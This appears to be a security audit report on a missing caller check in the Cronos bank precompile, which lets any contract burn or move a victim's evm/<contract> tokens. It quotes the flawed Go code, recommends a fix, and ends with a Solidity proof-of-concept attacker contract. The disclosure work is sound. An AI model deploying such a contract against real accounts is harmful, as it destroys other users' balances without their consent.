### Title
Unauthorized Burn of Victim's `evm/<contract>` Native Bank Tokens via Bank Precompile — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract.Run` handler for `BurnMethodName` accepts an arbitrary `address` argument as the account to debit, but never verifies that this address equals `contract.Caller()`. Any EVM contract can therefore call `bank.burn(victimAddr, amount)` to destroy `evm/<callerContract>` tokens held by an arbitrary victim, with no consent from the victim.

---

### Finding Description

In `BankContract.Run`, the `MintMethodName`/`BurnMethodName` branch unpacks the first ABI argument as the target address and uses `contract.Caller()` only to derive the denom:

```go
// x/cronos/keeper/precompiles/bank.go  lines 121–150
recipient := args[0].(common.Address)          // attacker-controlled victim address
amount    := args[1].(*big.Int)
addr      := sdk.AccAddress(recipient.Bytes()) // victim's sdk address
if err := bc.checkBlockedAddr(addr); err != nil { // only rejects module accounts
    return nil, err
}
denom := EVMDenom(contract.Caller())           // evm/<callerContract>
amt   := sdk.NewCoin(denom, ...)
// ...
// BURN PATH — no check that addr == contract.Caller()
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
``` [1](#0-0) 

The only guard present is `checkBlockedAddr`, which only rejects Cosmos module accounts: [2](#0-1) 

There is no check of the form `recipient == contract.Caller()`. The `Executor` helper in `utils.go` does perform a signer-vs-caller check, but it is **not used** by `BankContract.Run`: [3](#0-2) 

The same missing check also affects `TransferMethodName` (the `sender` arg is never validated against `contract.Caller()`): [4](#0-3) 

---

### Impact Explanation

A malicious contract A can:
1. Mint `evm/A` tokens to a victim (or wait for the victim to receive them legitimately).
2. Call `bank.burn(victimAddr, amount)` from contract A.
3. The precompile executes `SendCoinsFromAccountToModule(ctx, victimAddr, ...)` followed by `BurnCoins`, destroying the victim's balance with no authorization from the victim.

This is unauthorized destruction of native Cosmos bank token balances — a **Critical** impact under the allowed scope ("Unauthorized burn … for … precompile-controlled assets").

---

### Likelihood Explanation

- No special privileges are required; any deployed EVM contract can call the bank precompile.
- The victim only needs to hold a nonzero balance of `evm/<attackerContract>` tokens, which the attacker can arrange by minting to the victim first, or by targeting users of a legitimate contract that uses the bank precompile.
- The attack is a single EVM transaction.

---

### Recommendation

Add an authorization check in the `BurnMethodName` branch (and symmetrically in `TransferMethodName`) that enforces the target address equals the calling contract:

```go
// burn: addr being debited must be the calling contract itself
if recipient != contract.Caller() {
    return nil, errors.New("burn: caller is not authorized to burn from this address")
}
```

For `transfer`, the `sender` argument must similarly be validated against `contract.Caller()`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import {IBankModule} from "./Bank.sol";

contract Attacker {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim
    function setup(address victim, uint256 amount) external payable {
        bank.mint(victim, amount);
    }

    // Step 2: burn victim's evm/<this> tokens without consent
    function exploit(address victim, uint256 amount) external payable {
        bool ok = bank.burn(victim, amount);
        require(ok, "burn failed");
        // victim's evm/<Attacker> balance is now destroyed
    }
}
```

1. Deploy `Attacker` at address `0xA`.
2. Call `setup(victim, 100)` — victim now holds 100 `evm/0xA` tokens.
3. Call `exploit(victim, 100)` — victim's balance is burned to zero without any signature or approval from victim.
4. Assert `bank.balanceOf(0xA, victim) == 0`.
